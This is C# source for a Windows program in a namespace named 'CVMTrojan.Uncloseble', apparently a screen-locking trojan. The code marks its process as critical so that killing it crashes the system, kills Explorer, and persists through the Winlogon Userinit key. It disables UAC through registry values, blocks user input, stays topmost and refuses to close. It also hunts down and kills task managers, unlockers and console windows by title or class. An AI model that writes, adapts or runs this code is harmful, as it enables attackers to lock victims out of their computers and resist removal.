using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace CVMTrojan.Uncloseble
{
    public partial class Form1 : Form
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtQueryInformationProcess(IntPtr hProcess, uint pic, ref uint pi, int cb, out int pSize);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        private const UInt32 SWP_NOSIZE = 0x0001;
        private const UInt32 SWP_NOMOVE = 0x0002;
        private const UInt32 TOPMOST_FLAGS = SWP_NOMOVE | SWP_NOSIZE;

        public Form1()
        {
            InitializeComponent();
        }

        protected override void WndProc(ref Message message)
        {
            const int WM_SYSCOMMAND = 0x0112;
            const int SC_MOVE = 0xF010;

            switch (message.Msg)
            {
                case WM_SYSCOMMAND:
                    int command = message.WParam.ToInt32() & 0xfff0;
                    if (command == SC_MOVE)
                        return;
                    break;
            }

            base.WndProc(ref message);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            int BreakOnTermination = 0x1D;
            int isCritical = 1;

            try
            {
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                foreach (var k in Process.GetProcessesByName("explorer"))
                {
                    k.Kill();
                }
            }
            catch { }

            Program.WinlogonStartup("Userinit", Application.ExecutablePath);

            DisableTimer.Enabled = true;
            WinlogonTimer.Enabled = true;
            TopMostTimer.Enabled = true;
            CriticalTimer.Enabled = true;
            BAN.Enabled = true;
            BLOCK.Enabled = true;


            
        }

        private void DisableTimer_Tick(object sender, EventArgs e)
        {
            try
            {
                RegistryKey key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                key.SetValue("EnableLUA", 0);
                key.SetValue("EnableInstallerDetection", 0);
                key.SetValue("PromptOnSecureDesktop", 0);
                key.SetValue("ConsentPromptBehaviorAdmin", 0);
                key.SetValue("EnableSecureUIAPaths", 0);
                key.SetValue("EnableVirtualization", 0);
                key.SetValue("FilterAdministratorToken", 0);
                key.SetValue("EnableUIADesktopToggle", 0);
            }
            catch { }
        }

        private void CriticalTimer_Tick(object sender, EventArgs e)
        {
            int BreakOnTermination = 0x1D;
            int isCritical = 1;

            try
            {
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            }
            catch { }
        }

        private void WinlogonTimer_Tick(object sender, EventArgs e)
        {
            Program.WinlogonStartup("Userinit", Application.ExecutablePath);
        }

        private void TopMostTimer_Tick(object sender, EventArgs e)
        {
            SetWindowPos(Handle, HWND_TOPMOST, 0, 0, 0, 0, TOPMOST_FLAGS);
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            MessageBox.Show("Try to delete your brain", "AnonCVMCoder", MessageBoxButtons.OK,MessageBoxIcon.Error);
        }

        #region dll
        [DllImport("USER32.DLL", CharSet = CharSet.Unicode)]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam);

        private delegate bool EnumWindowsProc(IntPtr hWnd, int lParam);

        [DllImport("USER32.DLL")]
        private static extern bool EnumWindows(EnumWindowsProc enumFunc, int lParam);

        [DllImport("USER32.DLL")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("USER32.DLL")]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("USER32.DLL")]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("USER32.DLL")]
        private static extern IntPtr GetShellWindow();

        [DllImport("kernel32.dll")]
        static extern int GetProcessId(IntPtr handle);


        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);


        public static class Win
        {
            public const int SW_HIDE = 0;
            public const int SW_SHOWNORMAL = 1;
            public const int SW_NORMAL = 1;
            public const int SW_SHOWMINIMIZED = 2;
            public const int SW_SHOWMAXIMIZED = 3;
            public const int SW_MAXIMIZE = 3;
            public const int SW_SHOWNOACTIVATE = 4;
            public const int SW_SHOW = 5;
            public const int SW_MINIMIZE = 6;
            public const int SW_SHOWMINNOACTIVE = 7;
            public const int SW_SHOWNA = 8;
            public const int SW_RESTORE = 9;
            public const int SW_SHOWDEFAULT = 10;
            public const int SW_FORCEMINIMIZE = 11;
            public const int SW_MAX = 11;
        }
        #endregion
        public static class OpenWindowGetter
        {
            /// <summary>Returns a dictionary that contains the handle and title of all the open windows.</summary>
            /// <returns>A dictionary that contains the handle and title of all the open windows.</returns>
            public static IDictionary<IntPtr, string> GetOpenWindows()
            {
                IntPtr shellWindow = GetShellWindow();
                Dictionary<IntPtr, string> windows = new Dictionary<IntPtr, string>();

                EnumWindows(delegate (IntPtr hWnd, int lParam)
                {
                    if (hWnd == shellWindow) return true;
                    //if (!IsWindowVisible(hWnd)) return true;

                    int length = GetWindowTextLength(hWnd);
                    if (length == 0) return true;

                    StringBuilder builder = new StringBuilder(length);
                    GetWindowText(hWnd, builder, length + 1);

                    windows[hWnd] = builder.ToString();
                    //Console.WriteLine(builder.ToString());
                    return true;

                }, 0);

                return windows;
            }
        }

        private void BAN_Tick(object sender, EventArgs e)
        {
            new Thread(() =>
            {

                foreach (KeyValuePair<IntPtr, string> window in OpenWindowGetter.GetOpenWindows())
                {

                    IntPtr handle = window.Key;
                    string title = window.Value;
                    Process[] processes = Process.GetProcesses();
                    string[] bad = { "process", "unlocker", "диспетчер", "монитор", "редактор", "checker" };
                    string[] badclass = {  "TMain", "TForm1", "ConsoleWindowClass" };
                    foreach (string b in bad)
                    {
                        if (title.ToLower().Contains(b))
                        {
                            SendMessage(handle, 0x10, IntPtr.Zero, IntPtr.Zero);
                            SendMessage(handle, 0x2, IntPtr.Zero, IntPtr.Zero);
                        }
                    }
                    foreach (string h in badclass)
                    {
                        IntPtr HWND = FindWindow(h, null);
                        if (HWND != IntPtr.Zero)
                        {
                            ShowWindow(HWND, Win.SW_HIDE);
                            SendMessage(HWND, 0x10, IntPtr.Zero, IntPtr.Zero);
                            SendMessage(HWND, 0x2, IntPtr.Zero, IntPtr.Zero);
                            SendMessage(HWND, 0x112, IntPtr.Zero, IntPtr.Zero);
                            GetWindowThreadProcessId(HWND, out uint processid);
                            try
                            {
                                Process process = Process.GetProcessById((int)processid);
                                string path = process.MainModule.FileName;
                                process.Kill();
                                process.WaitForExit();
                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine(ex.Message);
                            }
                        }
                    }
                }
            }).Start();
        }

        private void BLOCK_Tick(object sender, EventArgs e)
        {
            Program.BlockInput(true);
        }
    }
}
